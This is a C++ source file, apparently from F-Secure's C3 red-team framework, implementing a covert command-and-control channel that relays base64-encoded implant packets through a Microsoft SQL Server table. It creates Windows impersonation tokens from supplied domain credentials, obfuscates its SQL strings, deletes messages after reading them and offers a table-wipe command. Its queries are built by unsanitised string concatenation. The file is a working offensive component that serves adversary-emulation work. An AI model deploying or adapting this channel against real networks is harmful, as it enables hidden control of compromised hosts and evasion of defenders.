#include "Stdafx.h"
#include "MSSQL.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/Sql/Sql.hpp"

namespace
{
	constexpr static auto ID_COLUMN = 1;
	constexpr static auto MSGID_COLUMN = 2;
	constexpr static auto MSG_COLUMN = 3;
	constexpr static auto MAX_MSG_BYTES = 700000000;
}

FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	ByteReader{ arguments }.Read(m_servername, m_databasename, m_tablename, m_username, m_password, m_useSSPI);

	//create a new impersonation token and inject it into the current thread.
	if (m_useSSPI && !this->m_username.empty())
	{
		std::string user, domain;
		HANDLE hToken;
		user = this->m_username.substr(this->m_username.find("\\") + 1, this->m_username.size());
		domain = this->m_username.substr(0, this->m_username.find("\\"));

		if (!LogonUserA(user.c_str(), domain.c_str(), this->m_password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
			throw std::runtime_error("[x] error creating Token");

		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &m_impersonationToken))
			throw std::runtime_error("[x] error duplicating token");

		CloseHandle(hToken);
	}

	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	//Initial SQL Query is to identify if m_tablename exists
	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + m_tablename + OBF("';");
	auto hStmt = conn.MakeStatement(stmtString);
	hStmt.Execute();

	//if there are no rows then the table doesn't exist - so create it
	if (hStmt.Fetch() != SQL_SUCCESS)
	{
		stmtString = OBF("CREATE TABLE dbo.") + this->m_tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
		auto createStatement = conn.MakeStatement(stmtString);
		createStatement.Execute();
	}
}

size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteView packet)
{
	//connect to the database
	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	size_t bytesWritten = 0;
	std::string b64packet = "";

	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
	if (packet.size() > MAX_MSG_BYTES)
	{
		auto strpacket = packet.SubString(0, MAX_MSG_BYTES);
		b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
		bytesWritten = strpacket.size();
	}
	else
	{
		b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
		bytesWritten = packet.size();
	}

	std::string stmtString = OBF("INSERT into dbo.") + this->m_tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
	auto hStmt = conn.MakeStatement(stmtString);
	hStmt.Execute();

	return bytesWritten;
}

std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnReceiveFromChannel()
{
	//connect to the database
	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	const auto stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->m_tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
	auto hStmt = conn.MakeStatement(stmt);
	hStmt.Execute();

	std::vector<std::string> ids;
	std::vector<ByteVector> messages;

	while (hStmt.Fetch() == SQL_SUCCESS)
	{
		//get the ID
		auto id = hStmt.GetString(ID_COLUMN);
		ids.push_back(id);

		//Get the MSG column
		auto output = hStmt.GetString(MSG_COLUMN);
		auto packet = cppcodec::base64_rfc4648::decode(output);
		messages.push_back(std::move(packet));
	}

	//build a string '1','2','3',....,'N'
	std::string idList = "";
	for (auto &id : ids)
		idList += OBF("'") + id + OBF("',");

	//no need to send an empty delete command
	if (ids.size() > 0)
	{
		//Remove the trailing "," from the idList
		idList.pop_back();

		const auto stmt = OBF("DELETE FROM dbo.") + this->m_tablename + OBF(" WHERE ID IN (") + idList + OBF(");");;
		auto deleteStmt = conn.MakeStatement(stmt);
		//Delete all of the rows we have just read
		deleteStmt.Execute();
	}

	return messages;
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteView command)
{

	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return ClearTable();
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
{
	Sql::Enviroment env;
	auto conn = env.Connect(m_servername, m_databasename, m_username, m_password, m_useSSPI, m_impersonationToken);

	{
		const auto deleteStmt = OBF("DELETE FROM dbo.") + this->m_tablename + ";";
		auto hStmt = conn.MakeStatement(deleteStmt);
		hStmt.Execute();
	}

	{
		//reset the ID to 0
		const auto resetStmt = OBF("DBCC CHECKIDENT('dbo.") + this->m_tablename + OBF("', RESEED, 0)");
		auto hStmt = conn.MakeStatement(resetStmt);
		hStmt.Execute();
	}
	return {};
}

const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
{
	return R"_(
{
	"create": {
		"arguments": [
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Server Name",
				"description": "The Host of the target database"
			},
			{
				"type": "string",
				"name": "Database Name",
				"description": "The name of the database to write to"
			},
			{
				"type": "string",
				"name": "Table Name",
				"description": "The name of the table to write to"
			},
			{
				"type": "string",
				"name": "Username",
				"description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username",
				"min": 0
			},
			{
				"type": "string",
				"name": "Password",
				"description": "The password used to authenticate to the database",
				"min": 0
			},
			{
				"type": "boolean",
				"name": "Use Integrated Security (SSPI) - use for domain joined accounts",
				"description": "Set this to true and provide a domain\\username and password to perform token impersonation OR Set this to true and provide no credentials and the current process token will be used with SSPI",
				"defaultValue": false
			}
		]
	},
	"commands": [
		{
			"name": "Clear DB Table",
			"id": 0,
			"description": "Deletes all rows in the database",
			"arguments": []
		}
	]
}
)_";
}
